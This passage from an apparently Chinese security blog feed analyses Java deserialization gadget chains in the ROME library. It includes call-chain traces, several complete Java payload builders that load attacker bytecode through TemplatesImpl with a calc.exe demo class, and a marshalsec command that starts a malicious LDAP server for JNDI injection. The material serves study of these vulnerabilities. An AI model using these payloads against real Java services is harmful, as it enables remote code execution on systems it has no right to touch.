TemplatesImpl), 并在 return 时调用 <code>this.toString(prefix)</code> 这个重载方法</p><p>然后到TemplatesImpl.toString（）方法</p><p><img src="../images/image-20230508150654399.png" alt="image-20230508150654399"></p><p>方法内部先通过 <code>BeanIntrospector.getPropertyDescriptors()</code> 获取 <code>this._beanClass</code> 的 JavaBean, 然后遍历 getter, 判断其是否由 Object 类声明, 并且是否无参, 最后调用这个无参的 getter</p><p>再往下就是 TemplatesImpl 的内容了, 很容易想到它的 <code>_outputProperties</code> 属性存在 getOutputProperties 这个 getter, 并且在里面调用了 newTransformer 方法, 经过一系列调用最终加载 Java 字节码并执行它的无参构造方法</p><p>总的来说利用链还是比较简单的, 就是 ObjectBean EqualsBean ToStringBean 之间的相互调用</p><p> <strong>这里的话之后就是TemplatesImpl实例化恶意类的流程</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl--&gt;getOutputProperties()</span><br><span class="line">TemplatesImpl--&gt;newTransformer()</span><br><span class="line">        TemplatesImpl--&gt;getTransletInstance()</span><br><span class="line">            TemplatesImpl--&gt;defineTransletClasses()</span><br><span class="line">                TemplatesImpl--&gt;defineClass()</span><br></pre></td></tr></table></figure><h3 id="HashTable利用链"><a href="#HashTable利用链" class="headerlink" title="HashTable利用链"></a>HashTable利用链</h3><p>这条链子实际上就是在<strong>HashMap</strong>被ban的情况下进行反序列化，因为最终目的始终都是调用<strong>hashcode</strong>函数，而HashTbale中刚好调用了<strong>hashcode</strong>，因此仍然可以触发整套流程</p><p><img src="../images/image-20230508160704668.png" alt="image-20230508160704668"></p><p>这个HashTable里面的readObject方法，里面有一个key,然后这里面又有一个reconstitutionPut()方法，跟进这个方法</p><p><img src="../images/image-20230508160835775.png" alt="image-20230508160835775"></p><p>那么就可以利用这个来替换掉HashMap了</p><p>那么利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span><br><span class="line">NativeMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">DelegatingMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">Method.invoke(Object, Object...)</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">EqualsBean.hashCode()</span><br><span class="line">Hashtable&lt;K,V&gt;.reconstitutionPut(Entry&lt;?,?&gt;[], K, V)</span><br><span class="line">Hashtable&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure><p>这里话EqualsBean换成ObjectBean也行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(Hello.class);</span><br><span class="line"></span><br><span class="line">        setFieldValue(<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Hello&quot;</span>, templatesImpl);</span><br><span class="line">        setFieldValue(<span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;cls.getBytes()&#125;, templatesImpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templatesImpl);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        ht.put(equalsBean, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>(), templatesImpl);</span><br><span class="line"></span><br><span class="line">        Serialization.test(ht);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(String name, Object value, Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Hello.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Hello</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230508161225081.png" alt="image-20230508161225081"></p><h3 id="EqualsBean"><a href="#EqualsBean" class="headerlink" title="EqualsBean"></a>EqualsBean</h3><p>接下来我们来看这个类的定义</p><p><img src="../images/image-20230508162335613.png" alt="image-20230508162335613"></p><p><img src="../images/image-20230508162402274.png" alt="image-20230508162402274"></p><p>EqualsBean 刚好也存在 hashCode, 并且也能调用 <code>this._obj</code> 的 toString</p><p>那么这里就可以指定 <code>this._obj</code> 为 ToStringBean</p><p>这里的话在EqualsBean这个类的定义处就可以指定了</p><p>ToStringBean 的构造方法</p><p><img src="../images/image-20230508163433188.png" alt="image-20230508163433188"></p><p>我们指定 <code>_beanClass</code> 为 Templates.class, <code>_obj</code> 为 TemplatesImpl</p><p>这里为什么指定这些呢，这是在刚开始对ysoserial给的exp的时候，我们来完整跟了一遍，然后得到的参数</p><p>等下接下来的各种链子都是一样的道理</p><p>利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span><br><span class="line">NativeMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">DelegatingMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">Method.invoke(Object, Object...)</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">EqualsBean.hashCode()</span><br><span class="line">HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure><p><strong>paylaod</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(Hello.class);</span><br><span class="line"></span><br><span class="line">        setFieldValue(<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Hello&quot;</span>, templatesImpl);</span><br><span class="line">        setFieldValue(<span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;cls.getBytes()&#125;, templatesImpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templatesImpl);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(equalsBean, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>(), templatesImpl);</span><br><span class="line"></span><br><span class="line">        Serialization.test(map);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(String name, Object value, Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230508164210620.png" alt="image-20230508164210620"></p><h3 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h3><p>BadAttributeValueExpException 曾在 cc 链中出现过, 它的 readObject 方法也会调用 toString</p><p><img src="../images/image-20230508165124096.png" alt="image-20230508165124096"></p><p>valObj 从自身的 val 属性获取, 之后进入 if 判断, 这里的触发条件其实是 <code>System.getSecurityManager() == null</code>, 即未开启 Java 安全管理器, 最后调用 valObj.toString()</p><p><img src="../images/image-20230508165459463.png" alt="image-20230508165459463"></p><p>这里的val可控，所以valObj也可控</p><p><strong>利用链</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span><br><span class="line">NativeMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">DelegatingMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">Method.invoke(Object, Object...)</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">BadAttributeValueExpException.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(Hello.class);</span><br><span class="line"></span><br><span class="line">        setFieldValue(<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Hello&quot;</span>, templatesImpl);</span><br><span class="line">        setFieldValue(<span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;cls.getBytes()&#125;, templatesImpl);</span><br><span class="line">        setFieldValue(<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>(), templatesImpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templatesImpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">123</span>);</span><br><span class="line">        setFieldValue(<span class="string">&quot;val&quot;</span>, toStringBean, e);</span><br><span class="line"></span><br><span class="line">        Serialization.test(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(String name, Object value, Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230508165611024.png" alt="image-20230508165611024"></p><h3 id="ObjectBean"><a href="#ObjectBean" class="headerlink" title="ObjectBean"></a>ObjectBean</h3><p>ysoserial 链用的就是 ObjectBean</p><p>就是和我们文章刚开始的时候分析的一样</p><p>利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(Hello.class);</span><br><span class="line"></span><br><span class="line">        setFieldValue(<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Hello&quot;</span>, templatesImpl);</span><br><span class="line">        setFieldValue(<span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;cls.getBytes()&#125;, templatesImpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class, templatesImpl);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, objectBean1);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(objectBean2, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>(), templatesImpl);</span><br><span class="line"></span><br><span class="line">        Serialization.test(map);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(String name, Object value, Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HotSwappableTargetSource"><a href="#HotSwappableTargetSource" class="headerlink" title="HotSwappableTargetSource"></a>HotSwappableTargetSource</h2><p>这个其实我们在之前的文章，也就是西湖论剑的easy_api里提到过，一个拿来当跳板的类，这个类有equals方法，可以触发Xstring的toString，那么也就可以接上Rome的后半段</p><p>这里的话需要导入一个maven</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;5.3.12&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230508171236938.png" alt="image-20230508171236938"></p><p>这边的流程也很简单，首先入口还是hashmap，里面的putval函数调用了equals，然后key可控，然后就到了HotSwappableTargetSource里面的equals</p><p><img src="../images/image-20230508171756171.png" alt="image-20230508171756171"></p><p><strong>target：左边的是h2右边equals里面的是h1</strong></p><p>这里的target就是xstring，右边里面的内容就是ToStringBean，随之进入Xstring的equals方法里</p><p><img src="../images/image-20230508172034808.png" alt="image-20230508172034808"></p><p>然后这里的obj2就是前面右边的target，就是toStringBean</p><p>obj2就是ToStringBean，因此链子闭合，逻辑无误</p><p>然后链子就构造完成了</p><h3 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h3><p>这个类是在FastJson反序列化里见到的一个类，这个类中调用了lookup方法，因此可以进行JNDI注入，所以JDK版本也要注意一下，jdl8的话要小于191版本<br>这个类的入口点是在一个get方法上<code>JdbcRowSetImpl.getDatabaseMetaData()</code>,而rome链中又可以调用任意get方法，那其实也就和TempaltesImpl链思路是一样的，只是在不能使用TempaltesImpl时可以进行替换<br>这里介绍一个工具，marashalsec，用来起恶意ldap和rmi服务端的一个工具，很方便<br><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer [http://](http://127.0.0.1:8888/#EXP)localhost:8888/#Exploit 9999</code><br>在8888端口放上你的payload，这里就准备一个弹计算机的，名字改为Exploit</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://goodapple.top/archives/1145&quot;&gt;参考文章&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;从零开始分析&lt;/p&gt;
&lt;p&gt;ROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象</summary>
      
    
    
    
    
    <category term="java反序列化-Rome" scheme="https://ke1nys.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Rome/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之BCEL ClassLoader</title>
    <link href="https://ke1nys.github.io/posts/30ead299.html"/>
